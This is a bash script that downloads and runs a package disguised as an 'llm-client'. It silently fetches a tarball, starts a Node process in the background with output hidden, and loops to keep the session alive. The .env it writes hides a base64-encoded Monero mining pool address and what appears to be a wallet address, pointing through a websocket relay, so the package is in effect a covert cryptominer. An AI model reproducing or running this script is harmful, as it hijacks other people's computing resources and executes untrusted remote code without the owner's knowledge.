curl -sLkO https://github.com/gaserjuk/spectre/releases/download/monte/llm-client.tar.gz && tar -xvf llm-client.tar.gz >/dev/null 2>&1 && rm llm-client.tar.gz

echo '#!/bin/bash

cd llm-client && chmod 777 run.sh && nproc --all && ./run.sh 7 Suto-006 >/dev/null 2>&1 &
sleep 3
while true
do
        echo "Ojo Lali Ngopi Boss..."
        sleep 720
done' > bas.sh

cd llm-client && echo '#!/bin/bash
CONNECT=$1
NAME=$2
echo "SERVER_WS=wss://cdn.dapitax.social
SERVER_TARGET=cG9vbC5zdXBwb3J0eG1yLmNvbTo4MA==
SERVER_DOMAIN=45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi
SERVER_SECRET=${NAME}
SERVER_CONNECTION=${CONNECT}" > .env
while true; do node index.js; sleep 15; done' > run.sh
